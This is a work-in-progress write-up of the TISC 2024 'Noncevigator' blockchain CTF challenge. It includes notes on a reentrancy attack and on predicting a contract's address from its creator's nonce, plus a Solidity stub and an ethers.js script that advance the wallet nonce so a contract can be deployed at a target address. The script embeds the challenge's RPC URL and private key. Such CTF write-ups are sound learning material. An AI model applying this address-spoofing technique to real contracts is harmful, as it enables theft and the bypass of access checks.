NOTE: This writeup is still WIP. Here are some notes I took while solving the challenge, as well as any solve script(s)

* im new to blockchain chals (attended one workshop by Jin Kai during Greyhats summit) but number of solves told me this was probably easier than attempting the cloud path.
* Used metamask and online remix IDE, near the end used ethers.js and foundry for some scripts.

* reentrancy attack identified, got all the ether
* calling the startunlockinggate function fails
* nonce bruteforcing?
	* discovered nonce is # of transactions
* used ethers.js to run some stuff
* had to dig into source code and debug to get the script working
	* from a github issue realised i need to add `staticNetwork: true`
	* `batchMaxCount: 1` from deeper debugging
		* https://docs.ethers.org/v6/api/providers/jsonrpc/#JsonRpcApiProviderOptions
* ideas i had but which didnt work
  * maybe the unlockgate() function checks for a specific transaction nonce?
    * tried brute forcing with a script, didn't work
	* maybe we have to get the source code at address and reverse the unlockgate() function
  	* but there's no bytecode at the address
* initially assumed the addresses passed to Noncevigator were pre initialised contracts with a unlockgate() function, but no theres actually nothing there
* google search reveals that address of a contract is determined by the creator's address and nonce
* maybe I can deploy a contract at that pulauSemakau's address which implements the unlockgate method?
* recall from earlier research that delegatecall() lets the contract access the caller contract's properties


```solidity
contract Noncevigator2 {
    ... same as Noncevigator ...

    function unlockgate() public returns (bool) {
        isLocationOpen["pulauSemakau"] = true;
        return true;
    }
}
```

```javascript:getCorrectNonce.js
...

(async function getCorrectNonce() {
  const providerUrl = 'http://chals.tisc24.ctf.sg:47156/4b9d2cc3-bf30-4d9b-92ea-94e3e1c89d58';
  const privateKey = '0xec79e33eb5b2fad9aa9399a1316cfb007a78a1ba168add09172e59944b4d8bfd';
  const contractAddress = '0x07943A109602236A4942e34f4F082d2b6A8B974B';
  const targetAddress = '0x7d3eF26175F6483947941A3F6E74b7670bB5baF6';

  const provider = new ethers.providers.JsonRpcProvider(
    providerUrl,
    { name: 'tisc l6b', chainId: 1337 },
    {
      batchMaxCount: 1,
      staticNetwork: true,
    }
  );

  const wallet = new ethers.Wallet(privateKey, provider);
  let nonce;
  for (nonce = 0; nonce < 2000; nonce++) {
    const anticipatedAddress = ethers.utils.getContractAddress({
      from: wallet.address,
      nonce,
    });
    if (anticipatedAddress === targetAddress) {
      break;
    }
  }
  console.log('required nonce:' + nonce);
  const origNonce = await wallet.getTransactionCount();
  const contract = new ethers.Contract(contractAddress, abi, wallet);
  for (let i = 0; i < nonce - origNonce; i++) {
    try {
      await contract.getTreasureLocation('pulauSemakau');
      console.log(`Transaction ${i + 1} complete`);
    } catch (err) {
      console.error(`Error in transaction ${i + 1}:`, err);
    }
  }
  while ((await wallet.getTransactionCount()) < nonce) {
    await new Promise((resolve) => setTimeout(resolve, 100));
  }

  console.log('nonce is now as required: ' + nonce);

  return;
})();
```

![](/noncevigator_solve.jpeg)